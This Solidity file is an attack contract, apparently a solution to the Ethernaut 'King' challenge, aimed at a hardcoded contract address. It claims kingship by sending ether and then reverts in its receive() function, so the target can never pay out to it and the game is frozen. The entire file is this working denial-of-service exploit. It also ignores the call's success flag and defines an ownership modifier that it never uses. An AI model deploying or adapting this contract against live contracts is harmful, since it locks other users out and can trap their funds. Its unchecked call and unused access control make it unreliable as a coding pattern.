//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IKing {
    function _king() external view returns (address);

    function prize() external view returns (uint);
}

contract KingAttack {
    address originalAddress = 0x3BaF52E36B7C0b867db4f3402DF559131EC76701;
    IKing public king = IKing(originalAddress);
    address public owner;

    constructor() public payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "require owner!");
        _;
    }

    function makeMeKing() public payable {
        (bool sent, ) = address(king).call{value: msg.value}("");
    }

    function getKing() public view returns (address) {
        return king._king();
    }

    function getPrize() public view returns (uint) {
        return king.prize();
    }

    receive() external payable {
        revert("1");
    }

    function sendEthToOwner() public {
        payable(owner).transfer(address(this).balance);
    }
}
